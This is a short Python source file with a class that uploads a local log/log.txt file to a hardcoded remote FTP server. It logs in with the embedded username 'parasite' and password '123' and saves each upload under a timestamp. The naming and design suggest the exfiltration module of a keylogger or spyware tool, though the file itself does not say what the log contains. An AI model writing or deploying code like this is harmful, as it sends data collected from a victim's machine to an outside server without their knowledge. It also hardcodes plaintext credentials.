import ftplib,os
from datetime import datetime
class myftp:
    def upload(self):
        now = datetime.now()
        date_time = now.strftime("%d-%m-%Y, %H.%M.%S")
        dir_path = os.path.dirname(os.path.realpath(__file__))
        realpath = os.path.join(dir_path,"log","log.txt")
        session = ftplib.FTP('171.97.6.227','parasite','123')
        file = open(realpath,'rb')                  # file to send
        session.storbinary(f'STOR log[{date_time}].txt', file)     # send the file
        file.close()                                    # close file and FTP
        session.quit()
#test = myftp()
#test.upload()
